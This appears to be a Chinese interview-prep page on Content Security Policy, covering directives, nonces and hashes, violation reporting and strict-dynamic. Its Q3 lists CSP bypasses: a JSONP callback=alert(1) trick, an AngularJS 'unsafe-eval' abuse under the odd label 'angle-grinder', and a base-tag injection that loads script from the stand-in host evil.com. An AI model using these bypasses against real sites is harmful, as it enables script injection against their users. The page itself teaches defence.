---
title: CSP 内容安全策略
description: CSP 完整指南，包含指令说明、配置方式、绕过攻击、监控报告的面试题
---

# CSP 内容安全策略

---

> **⭐ 简单 · CSP 基础**

### Q1: 什么是 CSP？它的作用是什么？

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**CSP（Content Security Policy）** 是一种安全机制，通过白名单方式限制页面能加载的资源，有效防御 XSS 和数据注入攻击。

**CSP 主要作用：**

1. **防御 XSS 攻击** - 限制脚本来源
2. **防止数据注入** - 限制加载外部资源
3. **阻止点击劫持** - 限制可嵌入页面的来源
4. **提供违规报告** - 发现潜在攻击

**CSP 工作原理：**

```html
<!-- 设置 CSP -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">

<!-- 效果 -->
<!-- ✅ 允许：来自同源的脚本 -->
<script src="/js/app.js"></script>

<!-- ❌ 阻止：来自 CDN 的脚本 -->
<script src="https://cdn.example.com/lib.js"></script>

<!-- ❌ 阻止：内联脚本 -->
<script>alert(1)</script>
```

**知识点：** `CSP` `安全策略` `XSS 防御`

:::

---

> **🔥 中等 · CSP 配置**

### Q2: CSP 有哪些常用指令？如何配置？

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**常用 CSP 指令：**

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'self';
  base-uri 'self';
  form-action 'self';
  report-uri /csp-report;
```

**指令详解：**

| 指令 | 作用 | 常用值 |
|------|------|--------|
| `default-src` | 默认策略 | `'self'` `'none'` |
| `script-src` | JS 脚本 | `'self'` `'nonce-xxx'` |
| `style-src` | CSS 样式 | `'self'` `'unsafe-inline'` |
| `img-src` | 图片 | `'self'` `data:` `https:` |
| `font-src` | 字体 | `'self'` 字体 CDN |
| `connect-src` | AJAX/WebSocket | `'self'` API 域名 |
| `frame-ancestors` | 父页面来源 | `'none'` `'self'` |

**知识点：** `CSP 指令` `配置`

:::

---

> **💀 困难 · CSP 绕过**

### Q3: CSP 有哪些已知的绕过方式？

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**CSP 绕过方式：**

**1. unsafe-inline 绕过**
```
script-src 'self' 'unsafe-inline'
→ 内联脚本可执行，CSP 形同虚设
```

**2. JSONP 端点绕过**
```
script-src 'self' https://trusted.com
→ https://trusted.com/api?callback=alert(1)
```

**3. angle-grinder 绕过（AngularJS）**
```
script-src 'self' 'unsafe-eval'
→ AngularJS 的表达式可被利用
```

**4. base-uri 绕过**
```html
<base href="https://evil.com">
<script src="/app.js"></script>
→ 实际加载 https://evil.com/app.js
```

**知识点：** `CSP 绕过` `安全风险`

:::

---

> **🔥 中等 · CSP nonce**

### Q4: nonce 和 hash 有什么区别？如何使用？

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**nonce 和 hash 区别：**

| 特性 | nonce | hash |
|------|-------|------|
| 原理 | 随机字符串，每次请求不同 | 脚本内容的 SHA256 哈希 |
| 维护 | 服务端动态生成 | 脚本变化需重新计算 |
| 适用 | 动态内联脚本 | 静态内联脚本 |

**nonce 使用：**

```js
// 服务端生成
const nonce = crypto.randomBytes(16).toString('base64')
res.setHeader('Content-Security-Policy', 
  `script-src 'self' 'nonce-${nonce}'`)

// 模板中使用
<script nonce="<%= nonce %>">
  console.log('安全')
</script>
```

**hash 使用：**

```html
<!-- 计算脚本内容的 SHA256 -->
<!-- Content-Security-Policy: script-src 'sha256-abc123...' -->
<script>
  console.log('固定脚本')
</script>
```

**知识点:**`nonce` `hash` `CSP`

:::

---

### Q5: CSP 的 report-uri 和 report-to 指令？如何监控 CSP 违规？

> **🔥 中等 · 安全**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**report-uri（旧标准）：**

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; report-uri /csp-report">
```

```js
// 服务端接收报告
app.post('/csp-report', express.json({
  type: 'application/csp-report'
}), (req, res) => {
  const { 'csp-report': report } = req.body
  console.log('CSP Violation:', report)
  // 记录到日志/监控系统
})
```

**report-to（新标准）：**

```js
// 首先定义报告端点
{
  "report-to": {
    "group": "csp-endpoint",
    "max_age": 10886400,
    "endpoints": [{ "url": "/csp-report" }]
  }
}

// CSP 头引用
Content-Security-Policy: report-to csp-endpoint; default-src 'self'
```

**报告内容示例：**

```json
{
  "csp-report": {
    "blocked-uri": "https://evil.com/script.js",
    "document-uri": "https://yoursite.com/page",
    "effective-directive": "script-src-elem",
    "original-policy": "default-src 'self'",
    "status-code": 200,
    "violated-directive": "script-src 'self'"
  }
}
```

**知识点:**`report-uri` `report-to` `CSP 监控`

:::

---

### Q6: Strict-Dynamic 是什么？如何解决 CSP 和内联脚本的矛盾？

> **🔥 困难 · 安全**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**Strict-Dynamic 的作用：**

解决 CSP 与第三方脚本的矛盾。允许通过 nonce/hash 验证的脚本动态加载其他脚本。

**传统 CSP 问题：**

```
script-src 'self' 'nonce-abc' https://cdn.example.com
```
需要为每个第三方脚本配置域名，维护困难。

**Strict-Dynamic 方案：**

```
Content-Security-Policy: 
  script-src 'nonce-abc' 'strict-dynamic'
```

```html
<!-- 带 nonce 的主脚本 -->
<script nonce="abc" src="/main.js"></script>

<!-- main.js 中可以动态创建脚本 -->
<!-- 这些脚本会自动被信任 -->
const script = document.createElement('script')
script.src = '/another.js'  // ✅ 允许
document.head.appendChild(script)
```

**优势：**

1. **减少白名单维护** - 不需要列出所有脚本域名
2. **第三方脚本兼容** - 第三方库可加载自己的依赖
3. **依然安全** - 只有带 nonce 的主脚本被信任

**限制：**

- 需要浏览器支持（Chrome 52+, Firefox 77+）
- 应该与 nonce 或 hash 一起使用
- 不应单独使用 `strict-dynamic`

**点赞使用案例：**

```
Content-Security-Policy: 
  default-src 'none';
  script-src 'nonce-{主脚本 nonce}' 'strict-dynamic' 'report-sample';
  base-uri 'self';
  report-uri /csp-report
```

**知识点:**`Strict-Dynamic` `CSP` `第三方脚本`

:::